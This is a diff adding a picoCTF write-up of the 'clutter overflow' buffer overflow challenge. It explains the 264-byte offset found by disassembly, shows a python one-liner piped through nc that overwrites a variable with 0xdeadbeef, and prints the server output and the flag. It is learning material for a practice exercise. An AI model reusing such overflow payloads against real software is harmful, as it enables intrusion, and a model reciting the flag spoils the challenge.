@@ -83,5 +83,51 @@ https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/
 # 3. clutter overflow
 > Description: Clutter, clutter everywhere and not a byte to use.
 nc mars.picoctf.net 31890
+## Solution:
+We first analyze the source code and find out that the flag will be printed only if its value is equal to GOAL (0xdeadbeef). We achieve this be buffer overflow.
+So "clutter" stores our standard input. When we view the assembly code after disassembling the source code, we see that even though max size of clutter is 256 (0x100), we need to input 8 more character to reach the overflow point. Start point of clutter is 280 and of code is 16 (after converting their size in hex to decimal). So our input needs to be more than 264 (16+264=280) characters as the 265th character will start overwriting code.
+
+<img width="1920" height="917" alt="image" src="https://github.com/user-attachments/assets/85c4b2e3-6595-4ffe-84cb-6fe6ad9fe5a0" />
+
+So the input string should contain anything for the first 264 characters and then contain the value of GOAL: 0xdeadbeef to overwrite code completely and get the flag. 0xdeadbeef must be written in 64 bit little endian form (as we can see that "code" has to have 8 bytes in disassembled code). To do this we execute a simple python command which forms this string and pipes it into our program: 
+
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*264 + b'\xef\xbe\xad\xde\x00\x00\x00\x00\n')" | nc mars.picoctf.net 31890
+
+```
+root@DESKTOP-9PHI4CM:~# python3 -c "import sys; sys.stdout.buffer.write(b'A'*264 + b'\xef\xbe\xad\xde\x00\x00\x00\x00\n')" | nc mars.picoctf.net 31890
+ ______________________________________________________________________
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
+|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
+| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
+|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
+| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
+|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
+.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
+|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
+| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
+|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
+|\|______|===============|________________|/|""""""""""""""""""""""""""
+" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
+""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+My room is so cluttered...
+What do you see?
+code == 0xdeadbeef: how did that happen??
+take a flag for your troubles
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+## Flag:
+```
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+## Concepts Learnt:
+The same as the previous challenges, about stack, buffer overflow. I also learnt how to write something in little endian format. I learnt how to find out the overflow point by calculating the distance between clutter and code by seeing the disassembled code.
+## Resources:
+https://ctf101.org/binary-exploitation/buffer-overflow/
+https://www.reddit.com/r/ExploitDev/comments/ffuvg6/calculating_the_offset/
 
 
